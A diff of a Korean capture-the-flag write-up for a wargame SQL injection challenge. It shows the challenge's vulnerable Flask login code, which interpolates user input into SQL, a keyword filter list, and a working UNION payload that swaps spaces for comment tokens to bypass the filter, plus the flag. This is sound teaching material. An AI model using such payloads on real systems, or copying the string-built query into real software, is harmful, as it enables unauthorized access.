@@ -1,55 +1,34 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 3.4 SQLi_WAF_4"
+title: "KnockOn Bootcamp 2nd - 3.4 SQLi WAF 4"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
+  - KnockOn Bootcamp 2nd
   - SQL Injection
   - Filter Bypass
-last_modified_at: 2024-08-29T15:30:00-05:00
+last_modified_at: 2024-08-30T05:30:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10033/>
 
-![3.4 SQLi WAF 4 1](/assets/images/writeup/web-hacking/knock-on/3-4_SQLi_WAF_4_1.png)
+![3.4 SQLi WAF 4 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-3-4-sqli-waf-4-1.png)
 
-![3.4 SQLi WAF 4 2](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_2.png)
+![3.4 SQLi WAF 4 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-3-4-sqli-waf-4-1.png)
 
-![3.4 SQLi WAF 4 3](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_3.png)
-
-|
-
-|
-
-|
+![3.4 SQLi WAF 4 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-3-4-sqli-waf-4-1.png)
 
 ### 목표
 
----
-
 필터링 로직을 우회하여 admin 계정으로 로그인하기
 
-|
-
 ### 공격 기법
-
----
 
 SQL Injection
 
 - Filter Bypass
-
-|
-
-|
-
-|
 
 ## 문제 코드
 
@@ -97,7 +76,7 @@ def login():
                 return render_template("login.html", error='no Hack!')
 
         query = text(f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'")
-        
+
         with db.engine.connect() as connection:
             result = connection.execute(query)
             user = result.fetchone()
@@ -122,17 +101,9 @@ if __name__ == "__main__":
     app.run(debug=True, host="0.0.0.0", port=8080)
 ```
 
-|
-
-|
-
-|
-
 ## 코드 분석
 
 ### login()
-
----
 
 ```python
 filtering_list = ['or', 'and', '"', ' ', '=', '<', '>', '\\']
@@ -140,13 +111,7 @@ filtering_list = ['or', 'and', '"', ' ', '=', '<', '>', '\\']
 
 등호, 부등호, 백슬래시가 추가되었고, 작은따옴표는 다시 사용 가능해짐
 
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 ```sql
 ' union select 1,(select username from user limit 1,1),3 #
@@ -154,21 +119,13 @@ filtering_list = ['or', 'and', '"', ' ', '=', '<', '>', '\\']
 
 백 슬래시는 사용 불가능하고, 작은 따옴표는 사용 가능하기 때문에 username 부분에서 쿼리를 실행할 수 있게됨
 
-|
-
 ```sql
 '/**/union/**/select/**/1,(select/**/username/**/from/**/user/**/limit/**/1,1),3/**/#
 ```
 
 공백은 사용 불가능하기 때문에 주석으로 대체
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ```python
 username: '/**/union/**/select/**/1,(select/**/username/**/from/**/user/**/limit/**/1,1),3/**/#
@@ -176,18 +133,8 @@ username: '/**/union/**/select/**/1,(select/**/username/**/from/**/user/**/limit
 password: 1
 ```
 
-|
-
-|
-
 ### FLAG
-
----
 
 ```python
 K0{WAF_is_no_use!}
 ```
-
-|
-
----
